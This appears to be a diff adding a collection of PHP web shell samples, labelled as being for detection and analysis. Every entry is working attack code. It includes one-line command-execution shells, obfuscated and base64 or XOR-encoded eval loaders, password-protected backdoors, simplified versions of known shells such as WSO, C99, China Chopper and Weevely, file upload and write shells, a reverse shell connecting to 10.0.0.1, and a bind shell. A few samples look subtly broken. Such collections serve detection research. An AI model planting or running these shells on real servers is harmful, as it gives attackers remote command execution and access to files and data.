@@ -1,0 +1,283 @@
+# PHP Web Shells
+# Web shell samples for detection and analysis
+
+# Basic PHP Shell
+<?php system($_GET['cmd']); ?>
+<?php echo shell_exec($_GET['cmd']); ?>
+<?php passthru($_GET['cmd']); ?>
+<?php exec($_GET['cmd']); ?>
+<?php `$_GET['cmd']`; ?>
+
+# One-liner PHP Shells
+<?php @eval($_POST['cmd']); ?>
+<?php @system($_REQUEST['cmd']); ?>
+<?php echo `$_GET['cmd']`; ?>
+<?=`$_GET[0]`?>
+<?=system($_GET[0]);?>
+
+# Obfuscated PHP Shells
+<?php $a=$_GET['a'];$a($_GET['b']); ?>
+<?php @$_GET[0]($_GET[1]); ?>
+<?php @$_POST[0]($_POST[1]); ?>
+<?php @call_user_func($_GET['a'],$_GET['b']); ?>
+<?php @create_function('',$_POST['cmd'])(); ?>
+
+# Base64 Encoded Shell
+<?php eval(base64_decode('c3lzdGVtKCRfR0VUWydjbWQnXSk7')); ?>
+<?php $a=base64_decode('c3lzdGVt');$a($_GET['cmd']); ?>
+
+# Assert Shell
+<?php assert($_POST['cmd']); ?>
+<?php @assert($_REQUEST['cmd']); ?>
+
+# Preg_replace Shell (PHP < 7)
+<?php preg_replace('/.*/e',$_POST['cmd'],''); ?>
+<?php preg_replace('/test/e',$_GET['cmd'],'test'); ?>
+
+# Array Map Shell
+<?php array_map("assert",(array)$_REQUEST['cmd']); ?>
+<?php array_filter(array($_REQUEST['cmd']),'assert'); ?>
+
+# Variable Function Shell
+<?php $a='system';$a($_GET['cmd']); ?>
+<?php ${'_GET'}['a']($_GET['b']); ?>
+
+# File Upload Shell
+<?php
+if(isset($_FILES['file'])){
+    move_uploaded_file($_FILES['file']['tmp_name'],$_FILES['file']['name']);
+}
+?>
+
+# File Write Shell
+<?php file_put_contents($_GET['file'],$_GET['data']); ?>
+<?php fputs(fopen($_GET['file'],'w'),$_GET['data']); ?>
+
+# Mini Shell
+<?php
+if(isset($_REQUEST['cmd'])){
+    echo "<pre>";
+    $cmd = ($_REQUEST['cmd']);
+    system($cmd);
+    echo "</pre>";
+    die;
+}
+?>
+
+# Simple Backdoor
+<?php
+if(md5($_GET['pass']) == '5f4dcc3b5aa765d61d8327deb882cf99'){
+    system($_GET['cmd']);
+}
+?>
+
+# WSO Shell (simplified)
+<?php
+$auth_pass = "5f4dcc3b5aa765d61d8327deb882cf99";
+if(isset($_POST['pass']) && md5($_POST['pass']) == $auth_pass){
+    if(isset($_POST['cmd'])){
+        echo "<pre>".shell_exec($_POST['cmd'])."</pre>";
+    }
+}
+?>
+
+# C99 Shell (simplified)
+<?php
+$login = 'admin';
+$pass = md5('password');
+if($_POST['login'] == $login && md5($_POST['pass']) == $pass){
+    echo shell_exec($_POST['cmd']);
+}
+?>
+
+# R57 Shell (simplified)
+<?php
+if(isset($_POST['cmd'])){
+    echo '<pre>'.shell_exec($_POST['cmd']).'</pre>';
+}
+?>
+
+# FilesMan Shell
+<?php
+if(isset($_GET['filesrc'])){
+    echo "<pre>".htmlspecialchars(file_get_contents($_GET['filesrc']))."</pre>";
+}
+if(isset($_GET['option']) && $_POST['opt'] != 'delete'){
+    echo shell_exec($_POST['cmd']);
+}
+?>
+
+# Weevely Shell (simplified)
+<?php
+$k="a1b2c3d4";
+$kh="e5f6g7h8";
+$kf="i9j0k1l2";
+$p="m3n4o5p6";
+@eval(@gzuncompress(@base64_decode(@str_replace(array("_","-"),array("/","+"),@$_COOKIE[$p]))));
+?>
+
+# China Chopper
+<?php @eval($_POST['chopper']);?>
+
+# b374k Shell (simplified)
+<?php
+$pass = 'b374k';
+if(isset($_POST['pass']) && $_POST['pass'] == $pass){
+    eval($_POST['cmd']);
+}
+?>
+
+# Anonymous Shell
+<?php
+if(isset($_REQUEST['cmd'])){
+    die("<pre>".shell_exec($_REQUEST['cmd'])."</pre>");
+}
+__halt_compiler();
+?>
+
+# Reverse Shell
+<?php
+$ip = '10.0.0.1';
+$port = 1234;
+$sock = fsockopen($ip, $port);
+$proc = proc_open('/bin/sh', array(0=>$sock, 1=>$sock, 2=>$sock), $pipes);
+?>
+
+# Bind Shell
+<?php
+$port = 1234;
+$sock = socket_create(AF_INET, SOCK_STREAM, SOL_TCP);
+socket_bind($sock, '0.0.0.0', $port);
+socket_listen($sock, 5);
+$client = socket_accept($sock);
+$proc = proc_open('/bin/sh', array(0=>$client, 1=>$client, 2=>$client), $pipes);
+?>
+
+# Web Shell with File Manager
+<?php
+if(isset($_GET['dir'])){
+    $dir = $_GET['dir'];
+    echo "<pre>";
+    print_r(scandir($dir));
+    echo "</pre>";
+}
+if(isset($_GET['read'])){
+    echo "<pre>".htmlspecialchars(file_get_contents($_GET['read']))."</pre>";
+}
+if(isset($_POST['write'])){
+    file_put_contents($_POST['file'], $_POST['content']);
+}
+if(isset($_GET['cmd'])){
+    echo "<pre>".shell_exec($_GET['cmd'])."</pre>";
+}
+?>
+
+# Database Shell
+<?php
+$conn = mysqli_connect('localhost', 'root', 'password', 'database');
+if(isset($_POST['query'])){
+    $result = mysqli_query($conn, $_POST['query']);
+    while($row = mysqli_fetch_assoc($result)){
+        print_r($row);
+    }
+}
+?>
+
+# Eval Shell with XOR
+<?php
+$key = 'secret';
+$code = $_POST['code'];
+for($i=0; $i<strlen($code); $i++){
+    $code[$i] = $code[$i] ^ $key[$i % strlen($key)];
+}
+eval($code);
+?>
+
+# Callback Shell
+<?php
+$funcs = array('system', 'shell_exec', 'exec', 'passthru');
+$func = $funcs[$_GET['f']];
+$func($_GET['cmd']);
+?>
+
+# Reflection Shell
+<?php
+$r = new ReflectionFunction('system');
+$r->invoke($_GET['cmd']);
+?>
+
+# Namespace Shell
+<?php
+namespace {
+    $a = $_GET['a'];
+    $b = $_GET['b'];
+    $a($b);
+}
+?>
+
+# Goto Shell
+<?php
+goto a;
+b:
+system($_GET['cmd']);
+goto c;
+a:
+goto b;
+c:
+?>
+
+# Heredoc Shell
+<?php
+$cmd = <<<EOD
+{$_GET['cmd']}
+EOD;
+system($cmd);
+?>
+
+# Nowdoc Shell
+<?php
+$a = 'system';
+$cmd = <<<'EOD'
+{$_GET['cmd']}
+EOD;
+$a($cmd);
+?>
+
+# Phar Shell
+<?php
+$phar = new Phar('shell.phar');
+$phar->startBuffering();
+$phar->addFromString('shell.php', '<?php system($_GET["cmd"]); ?>');
+$phar->setStub('<?php __HALT_COMPILER(); ?>');
+$phar->stopBuffering();
+?>
+
+# Stream Shell
+<?php
+$stream = fopen('php://input', 'r');
+$cmd = stream_get_contents($stream);
+eval($cmd);
+?>
+
+# Superglobal Shell
+<?php
+${$_GET[0]}[0]($_GET[1]);
+?>
+
+# Compact Shell
+<?php
+extract($_REQUEST);
+$$a($b);
+?>
+
+# Parse_str Shell
+<?php
+parse_str($_SERVER['QUERY_STRING']);
+$$a($b);
+?>
+
+# Import_request_variables Shell (PHP < 5.4)
+<?php
+import_request_variables('G');
+$$a($b);
+?>
